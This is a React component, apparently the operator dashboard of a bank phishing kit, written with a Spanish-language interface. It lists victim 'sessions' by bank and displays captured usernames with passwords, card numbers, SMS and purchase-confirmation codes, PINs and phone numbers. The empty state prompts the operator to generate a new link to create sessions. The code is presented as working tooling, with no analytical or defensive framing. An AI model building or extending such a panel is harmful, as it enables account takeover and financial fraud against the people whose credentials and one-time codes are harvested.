import React from 'react';
import { Session } from '@shared/schema';
import { Skeleton } from '@/components/ui/skeleton';

interface AccessTableProps {
  sessions: Session[];
  activeBank: string;
  selectedSessionId: string | null;
  onSelectSession: (sessionId: string) => void;
  isLoading: boolean;
}

const AccessTable: React.FC<AccessTableProps> = ({ 
  sessions, 
  activeBank, 
  selectedSessionId,
  onSelectSession,
  isLoading 
}) => {
  // Filter sessions by bank if a specific bank is selected
  const filteredSessions = activeBank === 'todos' 
    ? sessions 
    : sessions.filter(session => session.banco === activeBank);

  if (isLoading) {
    return (
      <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
        <div className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
          <div className="p-4">
            <Skeleton className="h-8 w-full mb-4" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
      <table className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
        <thead>
          <tr className="bg-[#222]">
            <th className="p-3 text-left">#</th>
            <th className="p-3 text-left">Folio</th>
            <th className="p-3 text-left">User:Password</th>
            <th className="p-3 text-left">Banco</th>
            <th className="p-3 text-left">Tarjeta</th>
            <th className="p-3 text-left">SMS</th>
            <th className="p-3 text-left">NIP</th>
            <th className="p-3 text-left">SMS COMPRA</th>
            <th className="p-3 text-left">Celular</th>
            <th className="p-3 text-left">Paso actual</th>
            <th className="p-3 text-left">Acciones</th>
          </tr>
        </thead>
        <tbody>
          {filteredSessions.length === 0 && (
            <tr>
              <td colSpan={11} className="p-4 text-center text-gray-400">
                No hay sesiones activas. Genere un nuevo link para crear una sesión.
              </td>
            </tr>
          )}
          
          {filteredSessions.map((session, index) => (
            <tr 
              key={session.id}
              className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''}`}
              onClick={() => onSelectSession(session.sessionId)}
            >
              <td className="p-3 text-[#ccc]">{index + 1}</td>
              <td className="p-3 text-[#ccc]">{session.folio}</td>
              <td className="p-3 text-[#ccc]">
                {session.username && session.password 
                  ? `${session.username}:${session.password}` 
                  : '--'}
              </td>
              <td className="p-3 text-[#ccc]">{session.banco}</td>
              <td className="p-3 text-[#ccc]">{session.tarjeta || '--'}</td>
              <td className="p-3 text-[#ccc]">{session.sms || '--'}</td>
              <td className="p-3 text-[#ccc]">{session.nip || '--'}</td>
              <td className="p-3 text-[#ccc]">{session.smsCompra || '--'}</td>
              <td className="p-3 text-[#ccc]">{session.celular || '--'}</td>
              <td className="p-3 text-[#ccc]">
                {/* Convert pasoActual to a more readable format */}
                {session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1)}
              </td>
              <td className="p-3 text-[#ccc]">
                <button 
                  className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
                  onClick={(e) => {
                    e.stopPropagation();
                    onSelectSession(session.sessionId);
                  }}
                >
                  Seleccionar
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default AccessTable;
